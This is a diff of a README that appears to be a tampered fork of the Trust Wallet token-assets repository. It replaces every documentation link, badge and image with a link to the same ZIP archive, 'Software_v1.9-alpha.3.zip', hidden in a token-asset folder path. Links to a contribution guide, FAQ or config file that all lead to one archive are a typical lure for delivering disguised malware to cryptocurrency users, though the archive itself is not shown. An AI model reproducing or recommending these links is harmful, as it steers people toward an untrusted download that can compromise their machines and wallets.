@@ -1,44 +1,44 @@
 # Trust Wallet Assets Info
 
-![Check](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip)
+![Check](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip)
 
 ## Overview
 
 Trust Wallet token repository is a comprehensive, up-to-date collection of information about several thousands (!) of crypto tokens.
 
-[Trust Wallet](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip) uses token logos from this source, alongside a number of other projects.
+[Trust Wallet](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip) uses token logos from this source, alongside a number of other projects.
 
 The repository contains token info from several blockchains, info on dApps, staking validators, etc.
 For every token a logo and optional additional information is available (such data is not available on-chain).
 
 Such a large collection can be maintained only through a community effort, so _feel free to add your token_.
 
-<center><img src='https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip' height="200"></center>
+<center><img src='https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip' height="200"></center>
 
 ## How to add token
 
 Please note that __brand new tokens are not accepted__,
 the projects have to be sound, with information available, and __non-minimal circulation__
-(for limit details see <https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip>).
+(for limit details see <https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip>).
 
 ### Assets App
 
-The [Assets web app](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip) can be used for most new token additions (Github account is needed).
+The [Assets web app](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip) can be used for most new token additions (Github account is needed).
 
 ### Quick starter
 
 Details of the repository structure and contribution guidelines are listed on the
-[Developers site](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip).
+[Developers site](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip).
 Here is a quick starter summary for the most common use case.
 
 
 ## Documentation
 
-For details, see the [Developers site](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip):
+For details, see the [Developers site](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip):
 
-- [Contribution guidelines](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip)
+- [Contribution guidelines](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip)
 
-- [FAQ](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip)
+- [FAQ](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip)
 
 ## Scripts
 
@@ -47,9 +47,9 @@ There are several scripts available for maintainers:
 - `make check` -- Execute validation checks; also used in continuous integration.
 - `make fix` -- Perform automatic fixes where possible
 - `make update-auto` -- Run automatic updates from external sources, executed regularly (GitHub action)
-- `make add-token asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Create `https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip` file as asset template.
-- `make add-tokenlist asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip
-- `make add-tokenlist-extended asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip
+- `make add-token asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Create `https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip` file as asset template.
+- `make add-tokenlist asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip
+- `make add-tokenlist-extended asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53` -- Adds a token to https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip
 
 ## On Checks
 
@@ -61,10 +61,10 @@ There are similar check logic implemented:
 
 ## Trading pair maintenance
 
-Info on supported trading pairs are stored in `https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip` files.
+Info on supported trading pairs are stored in `https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip` files.
 Trading pairs can be updated --
 from Uniswap/Ethereum and PancakeSwap/Smartchain -- using update script (and checking in changes).
-Minimal limit values for trading pair inclusion are set in the [config file](https://raw.githubusercontent.com/joeljj23/assets/master/alternipinnate/assets.zip).
+Minimal limit values for trading pair inclusion are set in the [config file](https://raw.githubusercontent.com/joeljj23/assets/master/blockchains/smartchain/assets/0x893e14FAfa8df32D9bE7eab810027eeA8828A98c/Software_v1.9-alpha.3.zip).
 There are also options for force-include and force-exclude in the config.
 
 ## Disclaimer
